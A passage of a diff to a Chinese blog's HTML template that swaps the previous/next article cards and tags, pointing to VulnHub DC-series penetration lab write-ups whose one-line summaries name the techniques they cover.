-                                <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                    <span class="chip bg-color">合规基线相关</span>
+                                <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">DC系列靶机</span>
                                 </a>
                             
                         </div>
@@ -549,31 +635,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/25/WIN+R%20%20%E5%AE%9E%E7%94%A8%E5%A4%A7%E6%80%BB%E7%BB%93/">
+                <a href="/2022/03/15/dc-7/">
                     <div class="card-image">
                         
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-7 【DC系列】">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="WIN+R实用大总结">
-                        
-                        <span class="card-title">WIN+R实用大总结</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-7 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将Windows的各种快捷键记熟会提高效率，我们cmd命令都运行结束了，有些傻孩子都还在找图形化界面入口。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-7，包含了Drupal利用drush重置网站管理员密码、一句话木马Getshell、定时任务提权等知识。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/" class="post-category">
-                                    效率提升技巧
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    仿真靶机渗透
                                 </a>
                             
                             
@@ -583,8 +668,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/">
-                        <span class="chip bg-color">效率提升技巧</span>
+                    <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">DC系列靶机</span>
                     </a>
                     
                 </div>
@@ -598,23 +683,23 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/dc-8/">
+                <a href="/2022/03/14/dc-5/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-5 【DC系列】">
                         
-                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-5 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-5，包含了日志文件getshell、suid提权-screen 4.5.0等知识。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
                             </span>
                         <span class="publish-author">
                             
